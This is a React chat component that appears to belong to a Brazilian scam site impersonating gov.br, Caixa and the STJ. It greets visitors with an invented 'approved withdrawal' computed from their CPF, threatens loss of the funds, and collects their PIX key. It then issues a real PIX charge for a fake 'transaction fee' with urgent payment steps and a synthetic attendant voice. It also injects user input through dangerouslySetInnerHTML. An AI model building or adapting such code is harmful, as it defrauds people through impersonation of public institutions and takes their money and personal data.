import { useState, useEffect, useRef } from "react";
import { CheckCircle2, Search, ArrowRight, ShieldCheck, Loader2, PlayCircle, PauseCircle, AlertCircle } from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import axios from "axios";
import { API_URL } from "../config";
import { QRCodeCanvas } from "qrcode.react";

interface ChatStepProps {
  data: {
    docType: string;
    docValue: string;
    birthDate: string;
  };
  onReset: () => void;
}

export function ChatStep({ data, onReset }: ChatStepProps) {
  const [messages, setMessages] = useState<any[]>([]);
  const [inputValue, setInputValue] = useState("");
  const [awaitingPix, setAwaitingPix] = useState(false);
  const [typing, setTyping] = useState(false);
  const [flowState, setFlowState] = useState<number>(0);
  const [leadName, setLeadName] = useState("");
  const [leadValue, setLeadValue] = useState("");
  const [leadPixKey, setLeadPixKey] = useState("");
  const [tarifa, setTarifa] = useState<number>(2.99);
  const [buyPixData, setBuyPixData] = useState<any>(null);
  
  const [audioUrl, setAudioUrl] = useState<string | null>(null);
  const audioRef = useRef<HTMLAudioElement | null>(null);
  
  const [attendant, setAttendant] = useState({ name: "Amanda", voiceId: "GM2UA3fbsIaLHcswCDX9" });

  const endOfMessagesRef = useRef<HTMLDivElement>(null);

  const calculateValue = (doc: string) => {
    const digits = doc.replace(/\D/g, "");
    const base = parseInt(digits.substring(0, 4)) || 1234;
    return (base * 1.5) + (parseInt(digits.slice(-2)) * 10);
  };

  useEffect(() => {
    endOfMessagesRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages, typing]);

  useEffect(() => {
    const setupChat = async () => {
      // Sorteia uma atendente
      const attendants = [
         { name: "Camila", voiceId: "EXAVITQu4vr4xnSDxMaL" },
         { name: "Letícia", voiceId: "ThT5KcBeYPX3keUQqHPh" },
         { name: "Amanda", voiceId: "GM2UA3fbsIaLHcswCDX9" },
         { name: "Juliana", voiceId: "JBFqnCBsd6RMkjVDRZzb" }
      ];
      const selectedAttendant = attendants[Math.floor(Math.random() * attendants.length)];
      setAttendant(selectedAttendant);

      try {
        const res = await axios.get(`${API_URL}/api/config`);
        if (res.data.tarifaTransicional) setTarifa(res.data.tarifaTransicional);
      } catch (e) {
        console.error("Config fetch failed", e);
      }

      setTyping(true);
      try {
        const response = await axios.post(`${API_URL}/api/v1/validate/document`, {
           docType: data.docType,
           docValue: data.docValue
        });
        
        const name = response.data?.name || response.data?.mockName || "Cidadão";
        setLeadName(name);
        
        const val = calculateValue(data.docValue);
        const formattedVal = val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
        setLeadValue(formattedVal);
        
        setTyping(false);
        addBotMessage(`Parabéns, ${name}! A sua solicitação de saque foi aprovada no valor de ${formattedVal} referentes a saldos esquecidos no CPF ${data.docValue}.`, undefined, "/assets/banners/meu_govbr.png");
        
        // Show second message after 2 seconds
        setTimeout(() => {
          setTyping(true);
          setTimeout(() => {
            setTyping(false);
            addBotMessage(`ATENÇÃO: Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central. Caso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos. Observação: Isso só acontecerá se você não concluir a etapa a seguir.`);
            
            // Show third message after 2 seconds
            setTimeout(() => {
              setTyping(true);
              setTimeout(() => {
                setTyping(false);
                addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`);
                setAwaitingPix(true);
              }, 1500);
            }, 2000);
          }, 1500);
        }, 2000);
      } catch (e) {
        setTyping(false);
        addBotMessage("Poxa, deu uma falha de conexão. Tenta recarregar a página, tá bom?");
      }
    };
    
    setupChat();
  }, []);

  const addBotMessage = (text: string, options?: any[], image?: string) => {
    setMessages(prev => [...prev, { sender: "bot", text, options, image }]);
  };

  const addUserMessage = (text: string) => {
    setMessages(prev => [...prev, { sender: "user", text }]);
  };

  const identifyPixType = (key: string) => {
    if (key.includes("@")) return "E-mail";
    const digits = key.replace(/\D/g, "");
    if (digits.length === 11 && !key.startsWith("(")) return "CPF";
    if (digits.length === 14) return "CNPJ";
    if (digits.length >= 10 && key.includes("(")) return "Celular";
    if (digits.length >= 10 && !key.includes("(")) return "Celular";
    return "Chave Aleatória";
  };

  const handleAction = async (action: string, payload?: string) => {
    if (action === "submit_pix") {
      const pix = payload || inputValue;
      if (!pix) return;
      
      const pixType = identifyPixType(pix);
      if (pixType === "Chave Aleatória" && pix.length < 8) {
         setAwaitingPix(false);
         setInputValue("");
         addUserMessage(pix);
         setTyping(true);
         setTimeout(() => {
            setTyping(false);
            addBotMessage("Eu não consegui identificar isso como uma chave PIX válida. Digite corretamente a sua Chave PIX:");
            setAwaitingPix(true);
         }, 1000);
         return;
      }

      setAwaitingPix(false);
      setInputValue("");
      addUserMessage(pix);
      setLeadPixKey(pix);
      setTyping(true);
      
      setTimeout(() => {
        setTyping(false);
        addBotMessage(`A sua **solicitação de saque foi aprovada** para a Chave Pix cadastrada:\n**Chave Pix:** ${pix}\n\nClique no botão abaixo para efetuar a **transferência do valor de ${leadValue}** para a conta da Chave Pix cadastrada.`, [
          { text: "Receber por PIX", action: "generate_payment" }
        ]);
      }, 1500);
    }
    else if (action === "generate_payment") {
      setMessages(prev => {
        const newMessages = [...prev];
        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
        return newMessages;
      });
      setTyping(true);
      
      try {
        const ttsRes = await axios.post(`${API_URL}/api/v1/tts`, { 
           name: leadName,
           attendantName: attendant.name,
           voiceId: attendant.voiceId,
           value: leadValue
        });
        if (ttsRes.data.audioBase64) {
           const url = `data:audio/mp3;base64,${ttsRes.data.audioBase64}`;
           setAudioUrl(url);
           if (audioRef.current) {
             audioRef.current.src = url;
             audioRef.current.play().catch(e => console.log("Autoplay blocked:", e));
           }
        }

        // Fetch BuyPix
        const pixRes = await axios.post(`${API_URL}/api/v1/buypix/create`, {
          amount: tarifa,
          payer_document: data.docValue,
          payer_name: leadName
        });

        if (pixRes.data.data) {
           setBuyPixData(pixRes.data.data);
        }
      } catch (err) {
         console.error("Payment generation error", err);
      }
      setTyping(false);
      setFlowState(2); // Mostra o comprovante final
    }
  };

  const copyPix = () => {
    if (buyPixData?.pix_qr_code) {
      navigator.clipboard.writeText(buyPixData.pix_qr_code);
      alert("PIX copiado com sucesso!");
    }
  };

  return (
    <div className="fixed inset-0 z-50 bg-[#161c24] flex flex-col font-sans overflow-hidden">
      
      {/* Messages Area */}
      <div className="flex-1 overflow-y-auto px-4 py-8 space-y-6">
        <AnimatePresence>
          {messages.map((msg, i) => (
            <motion.div 
              key={i} 
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start items-start gap-3'}`}
            >
              {msg.sender === 'bot' && (
                <div className="w-10 h-10 rounded-full flex-shrink-0 bg-[#005CA9] flex items-center justify-center overflow-hidden shadow-sm mt-1 border-2 border-[#161c24]">
                   {/* Logo gov.br simulada */}
                  <img src="https://i.imgur.com/rB0rJ44.png" alt="gov.br" className="w-full h-full object-contain p-1" />
                </div>
              )}

              <div className={`flex flex-col ${msg.sender === 'user' ? 'items-end' : 'items-start'} w-full max-w-[85%]`}>
                <div className={`p-4 text-[15px] leading-relaxed shadow-sm w-full ${
                  msg.sender === 'user' 
                    ? 'bg-[#1b365d] text-white rounded-2xl rounded-tr-sm' 
                    : 'bg-[#1e2732] text-[#d1d5db] rounded-2xl rounded-tl-sm'
                }`}>
                  {msg.image && (
                     <img src={msg.image} alt="Banner" className="w-full h-auto rounded-lg mb-3 shadow-sm object-cover" />
                  )}
                  {msg.text.split('\\n').map((line:string, idx:number) => (
                     <p key={idx} className={`${idx !== 0 ? 'mt-2' : ''}`} dangerouslySetInnerHTML={{__html: line.replace(/\*\*(.*?)\*\*/g, '<strong class="text-white">$1</strong>')}} />
                  ))}
                </div>

                {msg.options && msg.options.length > 0 && (
                  <div className="mt-3 flex justify-end w-full">
                    {msg.options.map((opt: any, j: number) => (
                      <button 
                        key={j}
                        onClick={() => handleAction(opt.action)}
                        className="bg-[#ff9029] hover:bg-[#e87f1f] text-white font-bold py-2.5 px-6 rounded transition-colors shadow-md text-sm tracking-wide"
                      >
                        {opt.text}
                      </button>
                    ))}
                  </div>
                )}
              </div>
            </motion.div>
          ))}

          {typing && (
             <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex justify-start items-start gap-3">
               <div className="w-10 h-10 rounded-full flex-shrink-0 bg-[#005CA9] flex items-center justify-center overflow-hidden shadow-sm mt-1 border-2 border-[#161c24]">
                 <img src="https://i.imgur.com/rB0rJ44.png" alt="gov.br" className="w-full h-full object-contain p-1" />
               </div>
               <div className="bg-[#1e2732] p-4 rounded-2xl rounded-tl-sm shadow-sm flex items-center space-x-2">
                  <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" />
                  <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '0.2s' }} />
                  <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '0.4s' }} />
               </div>
             </motion.div>
          )}

          {/* Estado Final (Ticket Caixa + Passo a Passo PIX) */}
          {flowState === 2 && (
            <motion.div 
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              className="flex flex-col gap-8 mt-6 pb-20 items-center w-full"
            >
              
              {/* Comprovante CAIXA */}
              <div className="w-full max-w-sm rounded-xl overflow-hidden shadow-2xl bg-[#f5f6f8]">
                {/* Header CAIXA Azul */}
                <div className="bg-[#005CA9] px-6 py-6 flex items-end justify-start relative overflow-hidden">
                   <h2 className="text-white font-extrabold text-3xl tracking-widest relative z-10 flex items-center">
                     CAIXA 
                     <span className="w-1 h-8 bg-orange-400 ml-3"></span>
                   </h2>
                   <div className="absolute inset-0 opacity-10 bg-[linear-gradient(45deg,transparent_45%,white_45%,white_55%,transparent_55%)] bg-[length:20px_20px]"></div>
                </div>

                <div className="bg-white px-6 py-5 rounded-t-2xl -mt-3 relative z-20 shadow-[0_-4px_10px_rgba(0,0,0,0.05)]">
                  {/* Valores e Data Header */}
                  <div className="flex justify-between items-start mb-6">
                    <div>
                      <p className="text-[13px] text-gray-500 font-medium mb-1">Valor</p>
                      <p className="text-[#005CA9] font-extrabold text-2xl">{leadValue}</p>
                    </div>
                    <div className="w-px bg-gray-200 h-10 mx-2"></div>
                    <div className="text-right">
                      <p className="text-[13px] text-gray-500 font-medium mb-1">Data</p>
                      <p className="text-[#005CA9] font-bold text-[15px]">{new Date().toLocaleDateString('pt-BR')}</p>
                      <p className="text-[#005CA9] text-xs">{new Date().toLocaleTimeString('pt-BR')}</p>
                    </div>
                  </div>

                  {/* Dados do Recebedor */}
                  <div className="border-t-2 border-[#005CA9] pt-3 mb-6">
                    <h3 className="text-[#005CA9] font-bold text-[15px] mb-4">Dados do recebedor</h3>
                    <div className="space-y-4">
                      <div>
                        <p className="text-sm text-gray-500">Nome</p>
                        <p className="text-base font-bold text-gray-800 uppercase">{leadName}</p>
                      </div>
                      <div>
                        <p className="text-sm text-gray-500">CPF</p>
                        <p className="text-base font-bold text-gray-800">***.{data.docValue.substring(3,6)}.{data.docValue.substring(7,10)}-**</p>
                      </div>
                      <div>
                        <p className="text-sm text-gray-500">Instituição</p>
                        <p className="text-base font-bold text-gray-800">CAIXA ECONÔMICA FEDERAL</p>
                      </div>
                    </div>
                  </div>

                  {/* Dados do Pagador */}
                  <div className="border-t-2 border-[#005CA9] pt-3 relative">
                    <h3 className="text-[#005CA9] font-bold text-[15px] mb-4">Dados do pagador</h3>
                    <div className="space-y-4">
                      <div>
                        <p className="text-sm text-gray-500">Nome</p>
                        <p className="text-base font-bold text-gray-800 uppercase">SUPERIOR TRIBUNAL DE JUSTIÇA - STJ</p>
                      </div>
                      <div>
                        <p className="text-sm text-gray-500">CNPJ</p>
                        <p className="text-base font-bold text-gray-800">**.043.145/0001-**</p>
                      </div>
                    </div>
                    
                    {/* Share Button */}
                    <div className="absolute bottom-0 right-0 w-12 h-12 bg-white rounded-full shadow-[0_3px_10px_rgba(0,0,0,0.1)] flex items-center justify-center border border-gray-100 cursor-pointer">
                      <svg className="w-5 h-5 text-orange-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8.684 13.342C8.886 12.938 9 12.482 9 12c0-.482-.114-.938-.316-1.342m0 2.684a3 3 0 110-2.684m0 2.684l6.632 3.316m-6.632-6l6.632-3.316m0 0a3 3 0 105.367-2.684 3 3 0 00-5.367 2.684zm0 9.316a3 3 0 105.368 2.684 3 3 0 00-5.368-2.684z" /></svg>
                    </div>
                  </div>
                </div>
                
                {/* Avisos STJ/Gov */}
                <div className="bg-[#f5f6f8] p-4 text-[10px] text-gray-500 text-center border-t border-gray-200">
                  <p>O STJ (Superior Tribunal de Justiça) e o Governo Federal informam que o pagamento da Tarifa Transacional de <strong>R$ {tarifa.toFixed(2)}</strong> é obrigatório para a liberação do seu benefício.</p>
                </div>
              </div>

              {/* Instruções de Pagamento estilo gov.br */}
              <div className="w-full max-w-sm mx-auto bg-[#004e98] rounded-xl overflow-hidden shadow-2xl pb-12 font-sans">
                {/* Header Instruções */}
                <div className="bg-white text-center py-8 px-4 rounded-b-[40px] mb-10 shadow-lg relative z-20">
                   <img src="https://i.imgur.com/rB0rJ44.png" alt="gov.br" className="h-8 mx-auto mb-4" />
                   <h2 className="text-[#004e98] font-extrabold text-xl leading-tight">COMO REALIZAR O<br/>PAGAMENTO DA TARIFA?</h2>
                   <p className="text-gray-500 text-xs mt-3 flex items-center justify-center gap-1">
                     <AlertCircle className="w-3 h-3" /> É necessário o pagamento para a liberação
                   </p>
                </div>

                <div className="px-4 space-y-16 relative">
                  {/* Linha vertical pontilhada ligando os passos */}
                  <div className="absolute left-1/2 top-0 bottom-0 w-px border-l-2 border-dashed border-[#246bc2] -translate-x-1/2 z-0"></div>

                  {/* Passo 1 - Laptop */}
                  <div className="relative z-10 flex flex-col items-center">
                    <h3 className="text-[#1961bd] font-black text-5xl mb-6 opacity-60 drop-shadow-sm tracking-widest">PASSO 1</h3>
                    
                    {/* CSS Laptop Mockup */}
                    <div className="flex flex-col items-center">
                      <div className="bg-gray-800 p-2 rounded-t-xl w-[260px] h-[160px] flex items-center justify-center shadow-lg relative z-10 border-b-4 border-gray-900">
                        {/* Tela do Laptop */}
                        <div className="bg-white w-full h-full rounded-sm flex flex-col items-center justify-start pt-3 relative overflow-hidden">
                           <img src="https://i.imgur.com/rB0rJ44.png" alt="gov.br" className="h-4 mb-2" />
                           <p className="text-[10px] text-gray-500 font-bold mb-1">CÓDIGO PIX DA TARIFA</p>
                           <p className="text-[#004e98] font-bold text-sm mb-2">R$ {tarifa.toFixed(2)}</p>
                           
                           {buyPixData?.pix_qr_code ? (
                             <button onClick={copyPix} className="bg-[#004e98] hover:bg-[#003870] text-white text-[11px] py-2 px-6 rounded-full font-bold shadow-md transition-transform active:scale-95 flex items-center gap-1 z-20 cursor-pointer">
                               <span>Copiar PIX</span>
                               <svg className="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg>
                             </button>
                           ) : (
                             <Loader2 className="w-5 h-5 text-[#004e98] animate-spin" />
                           )}
                           
                           {/* Mouse cursor icon fake */}
                           <div className="absolute right-12 bottom-6 text-black opacity-80 animate-bounce">
                             <svg width="24" height="24" viewBox="0 0 24 24" fill="white" stroke="black" strokeWidth="2"><path d="M5.5 3.21V20.8c0 .45.54.67.85.35l4.86-4.86a.5.5 0 01.35-.15h6.42c.45 0 .67-.54.35-.85L6.35 2.85a.5.5 0 00-.85.35z"/></svg>
                           </div>
                        </div>
                      </div>
                      {/* Base do Laptop */}
                      <div className="bg-gray-300 w-[300px] h-4 rounded-b-xl shadow-xl flex justify-center items-start z-0">
                         <div className="bg-gray-400 w-16 h-1.5 rounded-b-md"></div>
                      </div>
                    </div>

                    <p className="text-white text-center text-[15px] mt-6 px-8 font-medium">
                      Copie o código PIX na tela acima clicando no botão azul.
                    </p>
                  </div>

                  {/* Passo 2 - Laptop com senha (simulando app do banco) */}
                  <div className="relative z-10 flex flex-col items-center">
                    <div className="w-5 h-5 rounded-full border-[3px] border-[#004e98] bg-white absolute -top-10 z-10"></div>
                    <h3 className="text-[#1961bd] font-black text-5xl mb-6 opacity-60 drop-shadow-sm tracking-widest">PASSO 2</h3>
                    
                    {/* CSS Laptop Mockup */}
                    <div className="flex flex-col items-center">
                      <div className="bg-gray-800 p-2 rounded-t-xl w-[260px] h-[160px] flex items-center justify-center shadow-lg relative z-10 border-b-4 border-gray-900">
                        {/* Tela do Laptop */}
                        <div className="bg-white w-full h-full rounded-sm flex flex-col items-center justify-center p-4 relative overflow-hidden">
                           <div className="w-12 h-12 bg-[#004e98] rounded-2xl flex items-center justify-center mb-3 text-white shadow-inner">
                             <svg className="w-7 h-7" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>
                           </div>
                           <p className="text-gray-800 font-bold text-sm">App do Banco</p>
                           <div className="w-16 h-1 bg-gray-200 mt-2 rounded"></div>
                        </div>
                      </div>
                      {/* Base do Laptop */}
                      <div className="bg-gray-300 w-[300px] h-4 rounded-b-xl shadow-xl flex justify-center items-start z-0">
                         <div className="bg-gray-400 w-16 h-1.5 rounded-b-md"></div>
                      </div>
                    </div>

                    <p className="text-white text-center text-[15px] mt-6 px-8 font-medium">
                      Abra o aplicativo do seu banco de preferência no seu celular.
                    </p>
                  </div>

                  {/* Passo 3 - Celular + Cadeado (simulando colar o pix e segurança) */}
                  <div className="relative z-10 flex flex-col items-center">
                    <div className="w-5 h-5 rounded-full border-[3px] border-[#004e98] bg-white absolute -top-10 z-10"></div>
                    <h3 className="text-[#1961bd] font-black text-5xl mb-6 opacity-60 drop-shadow-sm tracking-widest">PASSO 3</h3>
                    
                    {/* CSS Laptop + Celular lado a lado mockup */}
                    <div className="flex items-end justify-center relative w-[300px] h-[180px]">
                      {/* Laptop */}
                      <div className="flex flex-col items-center absolute left-4 bottom-0">
                        <div className="bg-gray-800 p-2 rounded-t-lg w-[200px] h-[130px] flex items-center justify-center shadow-lg border-b-2 border-gray-900">
                          <div className="bg-white w-full h-full rounded-sm flex flex-col items-center justify-center p-2 relative overflow-hidden">
                             <img src="https://i.imgur.com/rB0rJ44.png" alt="gov.br" className="h-3 mb-2" />
                             <p className="text-[#004e98] font-bold text-xs">Segurança</p>
                             <p className="text-green-500 text-[8px] font-bold mt-1">✓ Pagamento Confirmado</p>
                          </div>
                        </div>
                        <div className="bg-gray-300 w-[230px] h-3 rounded-b-lg shadow-xl flex justify-center items-start"></div>
                      </div>

                      {/* Celular sobreposto */}
                      <div className="bg-gray-800 p-1 rounded-2xl w-[70px] h-[120px] shadow-2xl absolute right-6 bottom-[-10px] border border-gray-600 z-20 flex flex-col">
                        <div className="bg-white w-full h-full rounded-xl flex flex-col items-center pt-2 px-1 relative">
                          <div className="w-4 h-1 bg-gray-300 rounded-full mb-2"></div>
                          <div className="bg-yellow-400 text-[#004e98] text-[8px] font-black py-1 px-2 rounded-md shadow-sm w-full text-center">
                            COLA PIX
                          </div>
                          <div className="bg-[#004e98] text-white text-[7px] py-1 px-2 rounded shadow mt-2 w-full text-center">
                            CONFIRMAR
                          </div>
                        </div>
                      </div>
                    </div>

                    <p className="text-white text-center text-[15px] mt-8 px-6 font-medium">
                      Acesse a área PIX, escolha a opção <strong>Pix Copia e Cola</strong>, cole o código e confirme o pagamento.
                    </p>
                  </div>
                  
                  {/* Fundo de garantia - icone verde final */}
                  <div className="relative z-10 flex flex-col items-center mt-10">
                     <div className="bg-white rounded-full p-2 shadow-lg mb-4 border-4 border-[#004e98]">
                        <div className="bg-green-500 rounded-full p-3">
                          <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={3} d="M5 13l4 4L19 7" /></svg>
                        </div>
                     </div>
                     <p className="text-white text-center text-[15px] font-medium px-4">
                       Assim que pago, o valor de <strong>{leadValue}</strong> será depositado automaticamente na sua conta.
                     </p>
                  </div>

                </div>
              </div>

            </motion.div>
          )}

          <div ref={endOfMessagesRef} />
        </AnimatePresence>
      </div>

      {/* Input Area (Apenas quando aguarda o PIX) */}
      <AnimatePresence>
        {awaitingPix && (
          <motion.div 
            initial={{ opacity: 0, y: 100 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 100 }}
            className="p-4 bg-[#1e2732] flex items-center space-x-3 shadow-[0_-4px_15px_rgba(0,0,0,0.2)]"
          >
            <input 
              type="text" 
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && handleAction("submit_pix")}
              placeholder="Digite sua chave PIX..."
              className="flex-1 bg-[#161c24] border border-[#2d3748] text-white rounded-full px-5 py-3 text-sm focus:outline-none focus:border-[#ff9029]"
            />
            <button 
              onClick={() => handleAction("submit_pix")}
              className="w-12 h-12 bg-[#ff9029] text-white rounded-full flex items-center justify-center hover:bg-[#e87f1f] transition-colors shadow-lg"
            >
              <ArrowRight size={20} />
            </button>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Audio Player Oculto para autoplay e controle */}
      {audioUrl && (
         <audio ref={audioRef} style={{ display: 'none' }} />
      )}
    </div>
  );
}
